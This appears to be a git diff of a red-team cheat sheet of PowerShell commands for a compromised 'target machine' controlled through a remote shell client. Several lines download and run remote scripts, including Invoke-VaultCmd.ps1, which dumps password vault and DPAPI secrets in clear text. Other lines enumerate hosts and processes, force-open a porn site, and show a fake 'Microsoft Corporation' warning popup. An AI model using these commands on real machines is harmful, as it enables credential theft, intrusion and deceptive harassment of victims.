@@ -124,20 +124,7 @@ iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e
 systeminfo|Out-File systeminfo.log -force;echo "";Get-Content systeminfo.log|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:";echo "";Start-Sleep -Seconds 1;Remove-Item systeminfo.log -force
 ```
 
-#### Retrieve remote DNS entrys (resolve hostnames)
-```powershell
-Get-DnsClientCache|Select-Object Entry,Name,Data|Format-Table -AutoSize;$DnstTable = New-Object System.Data.DataTable;$DnstTable.Columns.Add("RemoteAddress")|Out-Null;$DnstTable.Columns.Add("DnsHostName")|Out-Null;$DnsHostsList = (Get-NetTCPConnection -State ESTABLISHED -EA SilentlyContinue).RemoteAddress;ForEach($TokenItem in $DnsHostsList){$ResolveNames = (Resolve-DnsName $TokenItem -EA SilentlyContinue).NameHost;$DnstTable.Rows.Add("$TokenItem","$ResolveNames")|Out-Null};$DnstTable|Format-Table -AutoSize
-```
-
-#### Retrieve active ip address of local lan (ping sweep)
-```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1" -outfile "PingSweep.ps1";powershell -file PingSweep.ps1 -Action 'Enum'
-```
-**remark:** <b><i>PingSweep.ps1</b></i> will run attached to <b><i>papacat</b></i> process {client} so.. its advice to wait 2\3 minuts for module to finish working.
-
-<br />
-
-#### Retrieve processes running
+#### Retrieve remote processes running
 ```powershell
 Get-Process|Select-Object Id,ProcessName,Description,StartTime|Where-Object{$_.ProcessName -iNotMatch '(wlanext|svchost|RuntimeBroker|SrTasks)'}|Format-Table -AutoSize
 ```
@@ -151,7 +138,20 @@ Start-Process https://youporn.com
 Stop-Process -Name "notepad.exe" -Force
 ```
 
-#### Send one message to target machine
+#### Retrieve remote DNS entrys (resolve hostnames)
+```powershell
+Get-DnsClientCache|Select-Object Entry,Name,Data|Format-Table -AutoSize;$DnstTable = New-Object System.Data.DataTable;$DnstTable.Columns.Add("RemoteAddress")|Out-Null;$DnstTable.Columns.Add("DnsHostName")|Out-Null;$DnsHostsList = (Get-NetTCPConnection -State ESTABLISHED -EA SilentlyContinue).RemoteAddress;ForEach($TokenItem in $DnsHostsList){$ResolveNames = (Resolve-DnsName $TokenItem -EA SilentlyContinue).NameHost;$DnstTable.Rows.Add("$TokenItem","$ResolveNames")|Out-Null};$DnstTable|Format-Table -AutoSize
+```
+
+#### Retrieve active ip address of local lan (ping sweep)
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1" -outfile "PingSweep.ps1";powershell -file PingSweep.ps1 -Action 'Enum'
+```
+**remark:** <b><i>PingSweep.ps1</b></i> will run attached to <b><i>papacat</b></i> process {client} so.. its advice to wait 2\3 minuts for module to finish working.
+
+<br />
+
+#### Send one message to target machine {message-box}
 ```powershell
 powershell (New-Object -ComObject Wscript.Shell).PopUp("BLOCKED ACCESS TO $Env:COMPUTERNAME' RELATED TO PORNOGRAPHIC`n     SURVEYS PERFORMED DURING WORKING HOURS ..",20,"                              * Microsoft Corporation *",0+0)
 ```
@@ -200,6 +200,11 @@ Remove-Item Browser.report -force
 #### Dump password vault {clear-text}
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1" -OutFile "Invoke-VaultCmd.ps1"|Unblock-File;powershell -File "Invoke-VaultCmd.ps1" -action "dump" -banner "true" -secure;Remove-Item -Path "Invoke-VaultCmd.ps1" -Force
+```
+
+#### Dump password vault DPAPI secrets
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1" -OutFile "Invoke-VaultCmd.ps1"|Unblock-File;powershell -File "Invoke-VaultCmd.ps1" -action "dpapi" -banner "true" -secure;Remove-Item -Path "Invoke-VaultCmd.ps1" -Force
 ```
 
 <br />
